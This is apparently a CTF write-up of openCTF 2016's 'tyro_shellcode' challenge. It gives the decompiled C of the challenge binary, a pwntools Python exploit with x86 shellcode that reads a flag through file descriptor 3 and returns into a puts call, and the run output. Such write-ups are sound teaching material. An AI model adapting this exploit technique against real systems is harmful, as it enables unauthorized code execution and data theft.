---
layout: post
title: openCTF 2016 - tyro_shellcode
category: [Exploitation]
tags: [Exploitation, openCTF]
comments: true
---

**Points:** 50
**Solves:** 
**Category:** Exploitation
**Description:** Baby's first shellcode problem.
Server: 172.31.1.43:1617
Binary: 172.31.0.10/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c

> [tyro_shellcode]({{site.url}}/assets/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c)

Baby shellcode, basically we get a file descriptor to the open flag file and we need to write shellcode to read from it and write it to stdout.

{% highlight C %}
int main() {
    flagFileDesc = open("/home/challenge/flag", 0x0);
    setbuf(STDIN, 0x0);
    setbuf(STDOUT, 0x0);
    alarm(30);
    
    mmap_addr = mmap(0x0, 0x80, 0x7, 0x22, 0xffffffff, 0x0);
    memset(mmap_addr, 0xc3, 127);
    memset(localBuffer, 0x0, 127);
    
    puts("OpenCTF tyro shellcode challenge.\n");
    puts("Write me some shellcode that reads from the file_descriptor");
    puts("I supply and writes it to the buffer that I supply");
    printf("%d ... 0x%08x\n", "I supply and writes it to the buffer that I supply", flagFileDesc, mmap_addr);

    read(0x0, mmap_addr, 0x20);

    ret = mmap_addr();

    puts(localBuffer);

    edx = canary ^ *0x14;
    COND = edx == 0x0;
    if (!COND) {
            eax = __stack_chk_fail();
    }
    return ret;
}

{% endhighlight %}

# Solution

In my exploit I decided to be lazy again and used a static file descriptor 3 and a static bss address as read buffer. After that I decided instead of executing a write syscall to just return in one of the `puts` calls in `main` with the bss buffer as argument.

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def sh():
  s = '''xor eax, eax
        xor ebx, ebx
        mov bl, 3
        mov ecx, 0x804a140
        mov al, 3
        mov dl, 0xff
        int 0x80
        push 0x804a140
        push 0x8048728
        ret
        '''

  return asm(s)

def exploit(r):
  r.recvuntil(' ... ')
  addr = int(r.recv(10), 16)
  log.info("Addr is at: " + hex(addr))

  r.send(sh())
  r.interactive()



if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

For those more interested in the shellcode, the last 2 lines `push 0x8048728, ret` is basically equal `jmp 0x8048728` which is the address of printf in `main`.

{% highlight text %}
➜  openCTF python ./shellcode.py
[*] For remote: ./shellcode.py HOST PORT
[+] Starting program '/vagrant/openCTF/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c': Done
[2207]
[*] Paused (press any to continue)
[*] Addr is at: 0xffb7ff4c
[*] Switching to interactive mode

flagflagflag=====FLAGFLAG    <--- fake local flag
$
{% endhighlight %}